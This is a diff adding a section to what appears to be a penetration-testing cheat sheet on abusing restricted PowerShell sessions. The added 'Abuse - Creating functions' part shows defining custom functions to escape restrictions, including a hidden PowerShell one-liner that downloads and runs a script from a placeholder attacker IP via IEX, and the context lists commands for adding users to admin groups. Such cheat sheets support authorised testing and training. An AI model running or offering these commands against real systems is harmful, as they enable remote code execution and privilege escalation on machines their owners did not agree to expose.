@@ -302,6 +302,18 @@ Get-Command
 Start-Process cmd.exe calc.exe
 ```
 
+#### Abuse - Creating functions
+- Check if user can create their own functions
+- Creates a function with the name `gl` and executes it.
+- Shortcut would be `${ <COMMAND>}`
+```
+function gl {Get-Location}; gl
+
+function gl {whoami}; gl
+
+function gl {powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://<IP>/shell.ps1'))"}; gl
+```
+
 #### Abuse - Grant a user to admin
 ```
 Add-ADGroupMember, Add-LocalGroupMember, net.exe, dsadd.exe
